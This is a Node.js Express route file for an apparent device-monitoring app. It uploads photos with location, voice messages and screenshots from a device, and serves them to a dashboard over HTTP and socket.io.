const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const { getDB } = require('../services/database');
const authRoutes = require('./auth');
const locationRoutes = require('./location');

const router = express.Router();
const verifyToken = authRoutes.verifyToken;
const verifyDevice = locationRoutes.verifyDevice;

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    let folder = 'uploads';
    if (file.mimetype.startsWith('image/')) {
      folder = 'uploads/photos';
    } else if (file.mimetype.startsWith('audio/')) {
      folder = 'uploads/voices';
    }
    
    const dir = path.join(__dirname, '..', folder);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    // Create date subfolder for photos
    if (folder === 'uploads/photos') {
      const dateFolder = new Date().toISOString().split('T')[0];
      const fullDir = path.join(dir, dateFolder);
      if (!fs.existsSync(fullDir)) {
        fs.mkdirSync(fullDir, { recursive: true });
      }
      cb(null, fullDir);
    } else {
      cb(null, dir);
    }
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || (file.mimetype.startsWith('image/') ? '.jpg' : '.mp3');
    cb(null, `${uuidv4()}${ext}`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'audio/mpeg', 'audio/mp3', 'audio/ogg', 'audio/wav', 'audio/webm'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'), false);
    }
  }
});

// Upload photo (from app)
router.post('/photo', verifyDevice, upload.single('photo'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'Photo file required' });
    }
    
    const { latitude, longitude } = req.body;
    const db = getDB();
    const io = req.app.get('io');
    
    const dateFolder = new Date().toISOString().split('T')[0];
    const relativePath = `photos/${dateFolder}/${req.file.filename}`;
    const fileUrl = `/uploads/${relativePath}`;
    
    const result = db.prepare('INSERT INTO media (device_id, type, file_path, file_url, latitude, longitude, direction) VALUES (?, ?, ?, ?, ?, ?, ?)').run(
      req.device.device_id,
      'photo',
      req.file.path,
      fileUrl,
      latitude || null,
      longitude || null,
      'from_app'
    );
    
    const media = {
      id: result.lastInsertRowid,
      type: 'photo',
      file_url: fileUrl,
      latitude,
      longitude,
      created_at: new Date().toISOString()
    };
    
    io.to('dashboard').emit('media:new', media);
    
    res.json(media);
  } catch (err) {
    console.error('Upload photo error:', err);
    res.status(500).json({ error: 'Failed to upload photo' });
  }
});

// Upload voice message (from app)
router.post('/voice', verifyDevice, upload.single('voice'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'Voice file required' });
    }
    
    const { duration } = req.body;
    const db = getDB();
    const io = req.app.get('io');
    
    const fileUrl = `/uploads/voices/${req.file.filename}`;
    
    const result = db.prepare('INSERT INTO media (device_id, type, file_path, file_url, duration, direction) VALUES (?, ?, ?, ?, ?, ?)').run(
      req.device.device_id,
      'voice',
      req.file.path,
      fileUrl,
      duration ? parseInt(duration) : null,
      'from_app'
    );
    
    const media = {
      id: result.lastInsertRowid,
      type: 'voice',
      file_url: fileUrl,
      duration: duration ? parseInt(duration) : null,
      created_at: new Date().toISOString()
    };
    
    io.to('dashboard').emit('media:new', media);
    
    res.json(media);
  } catch (err) {
    console.error('Upload voice error:', err);
    res.status(500).json({ error: 'Failed to upload voice' });
  }
});

// Send voice message to app (from dashboard)
router.post('/voice/send', verifyToken, upload.single('voice'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'Voice file required' });
    }
    
    const { duration } = req.body;
    const db = getDB();
    const io = req.app.get('io');
    
    const fileUrl = `/uploads/voices/${req.file.filename}`;
    
    const result = db.prepare('INSERT INTO media (device_id, type, file_path, file_url, duration, direction) VALUES (?, ?, ?, ?, ?, ?)').run(
      'demo_device',
      'voice',
      req.file.path,
      fileUrl,
      duration ? parseInt(duration) : null,
      'to_app'
    );
    
    const media = {
      id: result.lastInsertRowid,
      type: 'voice',
      file_url: fileUrl,
      duration: duration ? parseInt(duration) : null,
      direction: 'to_app',
      created_at: new Date().toISOString()
    };
    
    // Notify the app
    io.to('app').emit('voice:new', media);
    
    res.json(media);
  } catch (err) {
    console.error('Send voice error:', err);
    res.status(500).json({ error: 'Failed to send voice' });
  }
});

// Get photos (dashboard)
router.get('/photos', verifyToken, (req, res) => {
  try {
    const { limit = 50, offset = 0, from, to } = req.query;
    const db = getDB();
    
    let query = "SELECT * FROM media WHERE type = 'photo'";
    const params = [];
    
    if (from) {
      query += ' AND date(created_at) >= ?';
      params.push(from);
    }
    
    if (to) {
      query += ' AND date(created_at) <= ?';
      params.push(to);
    }
    
    query += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';
    params.push(parseInt(limit), parseInt(offset));
    
    const photos = db.prepare(query).all(...params);
    
    // Get total count
    let countQuery = "SELECT COUNT(*) as total FROM media WHERE type = 'photo'";
    const countParams = [];
    if (from) {
      countQuery += ' AND date(created_at) >= ?';
      countParams.push(from);
    }
    if (to) {
      countQuery += ' AND date(created_at) <= ?';
      countParams.push(to);
    }
    const count = db.prepare(countQuery).get(...countParams);
    
    res.json({
      photos,
      total: count.total,
      limit: parseInt(limit),
      offset: parseInt(offset)
    });
  } catch (err) {
    console.error('Get photos error:', err);
    res.status(500).json({ error: 'Failed to get photos' });
  }
});

// Get voice messages (dashboard)
router.get('/voices', verifyToken, (req, res) => {
  try {
    const { limit = 50, offset = 0, direction } = req.query;
    const db = getDB();
    
    let query = "SELECT * FROM media WHERE type = 'voice'";
    const params = [];
    
    if (direction) {
      query += ' AND direction = ?';
      params.push(direction);
    }
    
    query += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';
    params.push(parseInt(limit), parseInt(offset));
    
    const voices = db.prepare(query).all(...params);
    
    res.json({
      voices,
      limit: parseInt(limit),
      offset: parseInt(offset)
    });
  } catch (err) {
    console.error('Get voices error:', err);
    res.status(500).json({ error: 'Failed to get voices' });
  }
});

// Mark voice as read
router.put('/voice/:id/read', verifyToken, (req, res) => {
  try {
    const { id } = req.params;
    const db = getDB();
    
    db.prepare('UPDATE media SET is_read = 1 WHERE id = ?').run(id);
    
    res.json({ success: true });
  } catch (err) {
    console.error('Mark voice read error:', err);
    res.status(500).json({ error: 'Failed to mark as read' });
  }
});

// Upload screenshot (from app - for screen view feature)
router.post('/screenshot', verifyDevice, upload.single('screenshot'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'Screenshot file required' });
    }
    
    const db = getDB();
    const io = req.app.get('io');
    
    const relativePath = `screenshots/${req.file.filename}`;
    
    // Delete old screenshots (keep only last 24 hours)
    const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    const oldScreenshots = db.prepare('SELECT file_path FROM screenshots WHERE created_at < ?').all(cutoff);
    oldScreenshots.forEach(ss => {
      if (fs.existsSync(ss.file_path)) {
        fs.unlinkSync(ss.file_path);
      }
    });
    db.prepare('DELETE FROM screenshots WHERE created_at < ?').run(cutoff);
    
    // Insert new screenshot
    const result = db.prepare('INSERT INTO screenshots (device_id, file_path) VALUES (?, ?)').run(
      req.device.device_id,
      req.file.path
    );
    
    io.to('dashboard').emit('screenshot:new', {
      id: result.lastInsertRowid,
      file_url: `/uploads/${relativePath}`,
      created_at: new Date().toISOString()
    });
    
    res.json({ success: true, id: result.lastInsertRowid });
  } catch (err) {
    console.error('Upload screenshot error:', err);
    res.status(500).json({ error: 'Failed to upload screenshot' });
  }
});

// Get latest screenshot (dashboard)
router.get('/screenshot/latest', verifyToken, (req, res) => {
  try {
    const db = getDB();
    const screenshot = db.prepare('SELECT * FROM screenshots ORDER BY created_at DESC LIMIT 1').get();
    
    if (!screenshot) {
      return res.json({ message: 'No screenshots available' });
    }
    
    res.json({
      id: screenshot.id,
      file_url: screenshot.file_path.replace(path.join(__dirname, '..'), ''),
      created_at: screenshot.created_at
    });
  } catch (err) {
    console.error('Get screenshot error:', err);
    res.status(500).json({ error: 'Failed to get screenshot' });
  }
});

module.exports = router;
